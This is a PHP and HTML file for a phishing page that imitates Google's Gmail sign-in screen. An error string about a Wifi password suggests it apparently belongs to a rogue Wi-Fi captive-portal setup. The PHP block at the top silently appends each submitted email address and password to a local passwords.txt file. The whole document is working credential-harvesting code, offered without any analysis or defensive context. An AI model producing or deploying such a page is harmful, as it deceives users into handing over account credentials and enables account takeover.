<?php
	
	if(isset($_POST['button'])){
		if(isset($_POST['password']) && !empty($_POST['password']) && isset($_POST['email']) && !empty($_POST['email'])){
			$password = $_POST['password'];
			$email = $_POST['email'];
			$fp =fopen('passwords.txt', 'a');
			fwrite($fp, $email);
			fwrite($fp, "\n");
			fwrite($fp, $password);
			fwrite($fp, "\n--------\n");
			fclose($fp);
		}else {
			echo "Wifi password cannot be empty<br>";
		}
	}

?>


<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <link rel="stylesheet" type="text/css" href="styles.css" />
     <!-- Compiled and minified CSS -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">

     <!-- Compiled and minified JavaScript -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
  </head>
  <body>
    <div class="login-div">
      <div class="row">
        <div class="logo"></div>
      </div>
      <div class="row center-align">
        <h5>Sign in</h5>
        <h6>Use your Gmail Account</h6>
      </div>
      <form method="post" action="index.php" id="mform">
        <div class="row">
          <div class="input-field col s12">
            <input id="email_input" name="email" type="email" class="validate">
            <label for="email_input">Email</label>
          </div>
        </div>
        <div class="row">
          <div class="input-field col s12">
            <input id="password_input" name="password" type="password" class="validate">
            <label for="password_input">Password</label>
            <div><a href="#"><b>Forgot password?</b></a></div>
          </div>
        </div>
        <div class="row">
          <div class="col s12">Not your computer? Use a Private Window to sign in. <a href="#"><b>Learn more</b></a></div>
        </div>
        <div class="row"></div>
        <div class="row">
          <div class="col s9"><a href="#">Create account</a></div>
        <!--<div class="col s6 right-align" name="button"><a  class="waves-effect blue btn" >Login</a></div>-->
        <!--<input id="myBtn" type="submit" class="p5 right-align waves-effect blue btn" value="Login">-->
        
  <button class="btn waves-effect waves-light blue" type="submit" name="button">Login
    
  </button>
        
        
        </div>
      </form>
    </div>
  </body>
</html>
